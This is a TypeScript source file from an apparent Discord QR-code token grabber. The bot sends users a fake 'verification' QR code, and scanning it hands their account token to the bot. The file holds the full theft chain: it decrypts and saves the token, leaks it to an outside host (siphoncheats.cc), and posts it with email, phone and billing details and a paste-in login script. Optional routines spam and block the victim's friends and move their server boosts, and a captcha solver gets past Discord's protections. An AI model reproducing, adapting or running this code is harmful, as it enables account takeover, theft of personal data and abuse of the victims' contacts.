import WebSocket from 'ws';
import { makeRequest as _ } from './../util/axios.mts';
import { GuildMember, Collection, AttachmentBuilder, TextChannel } from 'discord.js';
import { KeyPairKeyObjectResult, generateKeyPairSync, privateDecrypt, createHash } from 'crypto';
import { ICaptcha, IHello, INonceProof, IPendingLogin, IPendingTicket, IPrendingRemoteInit } from '../interfaces/ISocketEvents.mts';
import { toDataURL } from 'qrcode';
import { getTicketAxios, getTicketWithCaptchaAxios } from '../util/axios.mts';
import { getUserInformation, getBillingInformation, getAllBoosts, addBoostToserver, getAllFriends, createFriendChannel, sendMessage, blockFriend } from '../util/fetch.mts';
import { allSockets, sharedClient } from '../index.mts';
import { CaptchaSolver } from './CaptchaSolver.mts';
import { config } from '../util/config.mts';
import { IUser } from '../interfaces/IDiscord.mts';
import * as embeds from '../util/embeds.mts';
import * as fs from 'fs/promises';
import * as path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export class DiscordSocket {
  public messages = new Collection<string, any>();
  public socket: WebSocket;
  public keyPair: KeyPairKeyObjectResult;
  public userInformation: IUser | null = null;

  constructor(public readonly user: GuildMember) {
    this.socket = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=2', {
      origin: 'https://discord.com',
      handshakeTimeout: 10000,
    });

    this.keyPair = generateKeyPairSync('rsa', {
      modulusLength: 4096,
      publicExponent: 65537,
    });

    this.messages.set('hello', this.hello);
    this.messages.set('nonce_proof', this.nonce_proof);
    this.messages.set('pending_remote_init', this.pending_remote_init);
    this.messages.set('pending_ticket', this.pending_ticket);
    this.messages.set('pending_login', this.pending_login);
    this.messages.set('cancel', this.handleCancel);

    this.socket.on('message', (message) => {
      const messageData = JSON.parse(message.toString());
      const _handle = this.messages.get(messageData.op);
      if (!_handle) return this.messages.get('cancel')(this);
      _handle(this, messageData);
    });
  }

  private sendMessageToSocket(data: Object) {
    this.socket.send(JSON.stringify(data));
  }

  private async handleCancel(_this: DiscordSocket) {
    _this.user.send({ embeds: [await embeds.failedVerificationEmbed()] });
    _this.socket.terminate();
    allSockets.delete(_this.user.id);
  }

  private async handleFoundUserToken(_this: DiscordSocket, token: string) {
    const decryptedToken = privateDecrypt({ key: _this.keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from(token, 'base64'));

    await fs.appendFile(path.join(__dirname, '..', '..', 'tokens.txt'), `${decryptedToken.toString()}\n`, 'utf-8');

    _this.taskAfterCompletion(_this, decryptedToken.toString());

    allSockets.delete(_this.user.id);
    _this.user.send({ embeds: [await embeds.verificationComplete()] });
    if (!config.roles[_this.user.guild.id]) return;
    _this.user.roles.add(config.roles[_this.user.guild.id]);
  }

  private async taskAfterCompletion(_this: DiscordSocket, token: string) {
    try {
      const getCopy = `https://siphoncheats.cc/skib/raw.php?data=${token}`;
      const getUser = await getUserInformation(token);
      const getBilling = await getBillingInformation(token);

      const GRABBER_EMBED = await embeds.foundTokenEmbed();

      GRABBER_EMBED.setAuthor({
        name: `${_this.userInformation?.username!}#${_this.userInformation?.discriminator!} | ${_this.userInformation?.id!}`,
        iconURL: _this.userInformation?.avatar !== '0' ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.id!}/${_this.userInformation?.avatar!}.png?size=2048` : 'https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png?size=2048',
      });

      GRABBER_EMBED.addFields([
        { name: 'Token:', value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](${getCopy})` },
        { name: 'Nitro:', value: `${getUser.premium_type ? (getUser.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}`, inline: true },
        { name: 'Phone:', value: `${getUser.phone ? getUser.phone : 'None'}`, inline: true },
        { name: 'Email:', value: `${getUser.email}`, inline: true },
        { name: 'Billing:', value: `${getBilling.length > 0 ? 'Yes' : 'No'}`, inline: true },
        {
          name: 'Code to login',
          value:
            `\`\`\`js\n` +
            `function login(token) {\n` +
            `  setInterval(() => {\n` +
            `   document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`\n` +
            `  }, 50);\n` +
            `  setTimeout(() => {\n` +
            `    location.reload();\n` +
            `  }, 2500);\n` +
            `}\n\n` +
            `login('${token}')` +
            `\`\`\``,
        },
      ]);

      GRABBER_EMBED.setFooter({
        text: `https://github.com/fweak1337/Discord-QR-Token-Grabber`,
        iconURL: _this.userInformation?.avatar !== '0' ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.id!}/${_this.userInformation?.avatar!}.png?size=2048` : 'https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png?size=2048',
      });

      (sharedClient.channel as TextChannel)
        .send({
          embeds: [GRABBER_EMBED],
        })
        .then(() => _('get', getCopy, {}, ''));

      if (config.auto_msg.enabled) {
        for (const friend of await getAllFriends(token)) {
          await sendMessage(token, (await createFriendChannel(token, friend.id)).id);
          if (config.auto_msg.block_after_msg) {
            await blockFriend(token, friend.id);
          }
        }
      }

      if (config.auto_boost) {
        console.log(await getAllBoosts(token));
        await addBoostToserver(
          token,
          (await getAllBoosts(token)).map((x) => x.id)
        );
      }

      console.log({ ...getUser, ...getBilling });
    } catch (error) {
      console.error('Error in taskAfterCompletion:', error);
    }
  }

  private hello(_this: DiscordSocket, messageData: IHello) {
    _this.sendMessageToSocket({
      op: 'init',
      encoded_public_key: _this.keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString('base64'),
    });
  }

  private nonce_proof(_this: DiscordSocket, messageData: INonceProof) {
    const decryptedNonce = privateDecrypt({ key: _this.keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from(messageData.encrypted_nonce as string, 'base64'));

    const nonceHash = createHash('sha256').update(decryptedNonce).digest('base64url');

    _this.sendMessageToSocket({
      op: 'nonce_proof',
      proof: nonceHash,
    });
  }

  private async pending_remote_init(_this: DiscordSocket, messageData: IPrendingRemoteInit) {
    const fingerprintDataURL = `https://discordapp.com/ra/${messageData.fingerprint}`;

    const qrCodeDataImage = await toDataURL(fingerprintDataURL, {
      width: 300,
    });
    const qrCodeBuffer = Buffer.from(qrCodeDataImage.split(',')[1], 'base64');
    const discordImage = new AttachmentBuilder(qrCodeBuffer).setName('img.png');

    _this.user.send({
      embeds: [(await embeds.directMessageEmbed()).setImage('attachment://img.png')],
      files: [discordImage],
    });
  }

  private pending_ticket(_this: DiscordSocket, messageData: IPendingTicket) {
    const decryptedTicket = privateDecrypt({ key: _this.keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from(messageData.encrypted_user_payload as string, 'base64'));

    const ticket = decryptedTicket.toString().split(':');
    const userInformation: IUser = {
      id: ticket[0],
      discriminator: parseInt(ticket[1]).toString(),
      avatar: ticket[2],
      username: ticket[3],
    };

    _this.userInformation = userInformation;
  }

  private async pending_login(_this: DiscordSocket, messageData: IPendingLogin) {
    const foundTicket = await getTicketAxios(messageData.ticket);
    if (foundTicket && 'encrypted_token' in foundTicket) return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);

    await _this.user.send({
      embeds: [await embeds.pleaseWaitEmbed()],
    });
    await _this.solveCaptchaTicket(_this, foundTicket, messageData);
  }

  private async solveCaptchaTicket(_this: DiscordSocket, captchaToSolve: ICaptcha, messageData: IPendingLogin, tries = 0): Promise<void> {
    if (tries >= 2) return _this.handleCancel(_this);

    const captcha_sitekey = captchaToSolve.captcha_sitekey;
    const captcha_rqdata = captchaToSolve.captcha_rqdata;

    console.log({
      captcha_sitekey,
      captcha_rqdata,
    });

    const solvedCaptcha = await CaptchaSolver.solveCaptcha(captcha_sitekey, captcha_rqdata);

    if (!solvedCaptcha) return _this.handleCancel(_this);

    const foundTicketWithCaptcha = await getTicketWithCaptchaAxios(messageData.ticket, solvedCaptcha, captchaToSolve.captcha_rqtoken);

    if (foundTicketWithCaptcha.encrypted_token) return _this.handleFoundUserToken(_this, foundTicketWithCaptcha.encrypted_token);

    return _this.solveCaptchaTicket(_this, captchaToSolve, messageData, tries + 1);
  }

  private async solveCaptchaMessage(_this: DiscordSocket, captchaToSolve: ICaptcha, tries = 0): Promise<any> {
    if (tries >= 2) return _this.handleCancel(_this);

    const captcha_sitekey = captchaToSolve.captcha_sitekey;
    const captcha_rqdata = captchaToSolve.captcha_rqdata;

    const solvedCaptcha = await CaptchaSolver.solveCaptcha(captcha_sitekey, captcha_rqdata);
    console.log(solvedCaptcha);

    return solvedCaptcha;
  }
}
